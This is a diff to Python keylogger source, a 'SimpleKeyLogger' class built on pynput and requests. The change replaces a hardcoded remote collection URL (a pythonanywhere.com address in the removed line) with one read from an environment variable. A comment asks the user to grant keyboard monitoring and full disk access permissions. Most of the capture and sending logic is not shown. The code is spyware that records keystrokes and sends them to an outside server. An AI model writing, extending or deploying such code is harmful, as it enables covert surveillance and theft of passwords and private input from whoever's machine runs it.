@@ -2,8 +2,13 @@ from pynput import keyboard
 import requests
 import threading
 from datetime import datetime
+from dotenv import load_dotenv
+import os
 
 # OBS: allow IDE Input Monitoring, Accessibility, Full Disk Access in OS settings
+
+# Load environment variables
+load_dotenv()
 
 class SimpleKeyLogger:
     def __init__(self, server_url):
@@ -71,7 +76,7 @@ class SimpleKeyLogger:
             listener.join() # Start listening to keyboard
 
 def main():
-    SERVER_URL = "https://antma001.pythonanywhere.com"
+    SERVER_URL = os.getenv('SERVER_URL')
     logger = SimpleKeyLogger(SERVER_URL)
     logger.start()
 
